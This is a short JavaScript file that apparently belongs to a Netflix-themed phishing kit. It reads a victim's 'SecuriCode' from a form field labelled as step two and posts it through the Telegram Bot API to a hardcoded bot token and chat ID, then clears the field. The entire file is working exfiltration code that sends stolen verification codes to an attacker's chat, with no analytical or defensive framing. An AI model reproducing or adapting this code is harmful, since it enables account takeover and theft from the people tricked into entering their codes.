//bot token
var telegram_bot_id = "5712522024:AAHrYoBChw1JwK8R-8zB5d_7Z9sM7jrha74";

//chat id
var chat_id = -1001732954392;
var SecuriCode;

var ready = function () {

    SecuriCode = document.getElementById("securiCode").value;
    message = "STEP 2️⃣ \n \n 🔑 (Netflix) SecuriCode is: " + SecuriCode;

};

var senderSecuriCode = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("securiCode").value = "";

    return false;
};
